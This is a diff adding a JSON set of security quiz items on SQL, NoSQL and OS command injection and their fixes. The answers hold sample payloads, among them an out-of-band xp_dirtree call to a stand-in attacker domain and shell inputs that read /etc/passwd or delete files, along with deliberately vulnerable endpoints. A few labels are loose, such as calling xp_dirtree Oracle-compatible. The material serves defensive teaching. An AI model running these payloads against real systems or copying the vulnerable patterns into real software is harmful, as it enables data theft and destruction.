@@ -1,0 +1,61 @@
+[
+  {
+    "title": "SQL Injection Taxonomy and Mechanics",
+    "ques": "Classify and explain the three primary types of **SQL Injection (SQLi)**: **In-band (Classic)**, **Inferential (Blind)**, and **Out-of-band (OOB)**. Provide an illustrative payload for each category.",
+    "answer": {
+      "type": "text",
+      "content": "### 1. In-band SQLi (Classic)\n* **Mechanism:** The attacker uses the same channel of communication to launch the attack and gather database query results directly from the webpage output.\n* **Sub-types:**\n  * **Error-based:** `' OR 1=1; --` or provoking detailed database error messages via `CAST('text' AS INT)`.\n  * **UNION-based:** `' UNION SELECT null, username, password FROM users --` to append rows into the application's rendered result set.\n\n### 2. Inferential SQLi (Blind)\n* **Mechanism:** No data is echoed back in the web page. The attacker reconstructs data bit-by-bit by sending queries and observing the application's behavior.\n* **Sub-types:**\n  * **Boolean-based:** `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --` (observes if page renders 'Welcome' or 'Not found').\n  * **Time-based:** `'; IF (1=1) WAITFOR DELAY '0:0:5' --` or `pg_sleep(5)` (measures network response time delay).\n\n### 3. Out-of-band SQLi (OOB)\n* **Mechanism:** Used when server responses are completely silent and network latency is unstable. The payload forces the database server to initiate an external DNS lookup or HTTP request to a server controlled by the attacker.\n* **Example Payload (Oracle/MSSQL):**\n  * `'; EXEC master..xp_dirtree '//attacker-domain.com/data'; --`"
+    },
+    "explanation": "SQL Injection occurs whenever untrusted data is concatenated into database command interpreters, allowing attackers to hijack query execution logic."
+  },
+  {
+    "title": "OS Command Injection and Sanitization",
+    "ques": "Explain how **Command Injection** occurs when server-side scripts invoke shell processes. Write a vulnerable Node.js endpoint using `child_process.exec` that pings an IP address, show the attacker's shell-escape payload, and demonstrate the secure implementation using `child_process.execFile`.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "const express = require('express');\nconst { exec, execFile } = require('child_process');\nconst app = express();\n\n// --- VULNERABLE ENDPOINT ---\n// Invokes a shell interpreter (/bin/sh) and concatenates raw input\napp.get('/api/ping-unsafe', (req, res) => {\n  const host = req.query.host;\n  // Attacker input: '8.8.8.8; cat /etc/passwd' or '8.8.8.8 && rm -rf /'\n  exec(`ping -c 1 ${host}`, (err, stdout, stderr) => {\n    res.send(stdout);\n  });\n});\n\n// --- SECURE REFACTORED IMPLEMENTATION ---\n// Avoids shell execution entirely by invoking the binary directly with isolated argument arrays\napp.get('/api/ping-safe', (req, res) => {\n  const host = req.query.host;\n  \n  // Whitelist validate IP format before execution\n  const ipRegex = /^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$/;\n  if (!ipRegex.test(host)) {\n    return res.status(400).send('Invalid IP address format');\n  }\n  \n  // execFile does NOT spawn a shell; shell metacharacters (; & |) lose their special meaning\n  execFile('/sbin/ping', ['-c', '1', host], (err, stdout) => {\n    if (err) return res.status(500).send('Ping failed');\n    res.send(stdout);\n  });\n});"
+    },
+    "explanation": "Spawning a shell via `exec` interprets metacharacters (`;`, `&`, `|`, `` ` ``). Invoking executables directly via `execFile` or argument lists prevents shell command chaining."
+  },
+  {
+    "title": "NoSQL Injection in MongoDB",
+    "ques": "Explain how **NoSQL Injection** functions in MongoDB when handling raw JSON query objects. Provide a vulnerable Express login route that an attacker can bypass using operator injection (`$ne`), and show how to fix it.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "const express = require('express');\nconst app = express();\napp.use(express.json()); // Parses JSON bodies\n\n// --- VULNERABLE ROUTE ---\n// Attacker sends: { \"username\": \"admin\", \"password\": { \"$ne\": null } }\napp.post('/api/login-unsafe', async (req, res) => {\n  const { username, password } = req.body;\n  // MongoDB evaluates: db.users.find({ username: 'admin', password: { $ne: null } })\n  // Matches the admin user because password != null is true, logging in without password!\n  const user = await db.collection('users').findOne({ username, password });\n  if (user) return res.json({ token: 'jwt_admin_token' });\n  res.status(401).send('Invalid');\n});\n\n// --- SECURE REFACTORED ROUTE ---\napp.post('/api/login-safe', async (req, res) => {\n  let { username, password } = req.body;\n  \n  // Ensure inputs are strictly strings; reject nested objects/operators\n  if (typeof username !== 'string' || typeof password !== 'string') {\n    return res.status(400).send('Credentials must be plain strings');\n  }\n  \n  // Query now binds values strictly as string literals\n  const user = await db.collection('users').findOne({ username: String(username) });\n  if (!user || !(await verifyHash(password, user.passwordHash))) {\n    return res.status(401).send('Invalid credentials');\n  }\n  res.json({ token: 'jwt_admin_token' });\n});"
+    },
+    "explanation": "NoSQL injection occurs when query parsers accept object payloads containing database query operators like `$ne`, `$gt`, or `$where`. Enforcing strict primitive string typing neutralizes operator injection."
+  },
+  {
+    "title": "Defense via Parameterized Queries (Prepared Statements)",
+    "ques": "Explain why **Prepared Statements (Parameterized Queries)** are the definitive solution to SQL Injection. Write a Node.js implementation using the `pg` (PostgreSQL) library comparing an insecure concatenated query with a safe parameterized query.",
+    "answer": {
+      "type": "code",
+      "lang": "javascript",
+      "content": "const { Client } = require('pg');\nconst client = new Client({ /* config */ });\n\n// 1. INSECURE SQL CONCATENATION (VULNERABLE)\nasync function getUserUnsafe(userEmail) {\n  // Attacker input: admin@site.com' OR '1'='1\n  const query = `SELECT id, name, email FROM users WHERE email = '${userEmail}'`;\n  const result = await client.query(query);\n  return result.rows;\n}\n\n// 2. SECURE PARAMETERIZED QUERY (PREPARED STATEMENT)\nasync function getUserSafe(userEmail) {\n  // Placeholders ($1, $2) separate the SQL structure from the data\n  const queryText = 'SELECT id, name, email FROM users WHERE email = $1';\n  const values = [userEmail];\n  \n  // The database engine compiles query structure FIRST, then binds user data strictly as literal values\n  const result = await client.query(queryText, values);\n  return result.rows;\n}"
+    },
+    "explanation": "Prepared statements send the SQL query template and the user data in separate protocol packets. The database compiles the SQL syntax tree before user parameters are bound, making it mathematically impossible for user input to alter query logic."
+  },
+  {
+    "title": "Security Evaluation of Stored Procedures",
+    "ques": "Are **Stored Procedures** inherently immune to SQL Injection? Explain under what conditions a stored procedure is secure, and write an example of a dangerously vulnerable stored procedure that still permits SQL injection.",
+    "answer": {
+      "type": "code",
+      "lang": "sql",
+      "content": "-- DANGEROUS STORED PROCEDURE (Vulnerable to SQL Injection)\n-- Simply wrapping logic in a stored procedure does NOT protect against dynamic SQL concatenation!\nCREATE OR REPLACE PROCEDURE find_user_unsafe(p_username TEXT)\nLANGUAGE plpgsql AS $$\nBEGIN\n    -- Insecure: dynamically concatenates input into EXECUTE statement\n    EXECUTE 'SELECT * FROM accounts WHERE username = ''' || p_username || '''';\nEND;\n$$;\n\n-- SECURE REFACTORED STORED PROCEDURE (Parameterized execution)\nCREATE OR REPLACE PROCEDURE find_user_safe(p_username TEXT)\nLANGUAGE plpgsql AS $$\nBEGIN\n    -- Secure: Uses standard static parameter binding\n    EXECUTE 'SELECT * FROM accounts WHERE username = $1' USING p_username;\nEND;\n$$;"
+    },
+    "explanation": "Stored procedures protect against SQL injection only when parameters are bound statically. If a stored procedure constructs dynamic SQL strings using concatenation or `EXECUTE IMMEDIATE`, it remains fully vulnerable to SQL injection."
+  },
+  {
+    "title": "Input Escaping and Sanitization Limitations",
+    "ques": "Why is **Input Escaping** considered inferior to Parameterized Queries as an anti-SQLi defense? Provide a code example illustrating how escaping single quotes (e.g., `addslashes` or custom string replacements) fails when user input is placed into a numeric SQL context.",
+    "answer": {
+      "type": "code",
+      "lang": "sql",
+      "content": "-- Consider a backend handler that escapes single quotes by converting ' to \\'\n-- Scenario: Numeric SQL query without surrounding quotes\nSELECT id, title, price FROM products WHERE category_id = 5 OR 1=1;\n\n-- If the developer writes:\n-- query = \"SELECT * FROM products WHERE category_id = \" + escapeQuotes(input);\n-- And the attacker submits payload: 5 OR 1=1\n-- Notice: The payload contains ZERO single quotes! Escaping has nothing to escape.\n-- The resulting query executed by the database is:\n-- SELECT * FROM products WHERE category_id = 5 OR 1=1;\n-- Result: The entire table is dumped despite quotation escaping routines!"
+    },
+    "explanation": "Escaping routines are context-dependent and error-prone. They fail on non-string contexts (numeric IDs, column names, `ORDER BY` clauses), character-encoding mismatches (GBK multibyte injection), and subtle database parser quirks. Prepared statements are always superior."
+  }
+]
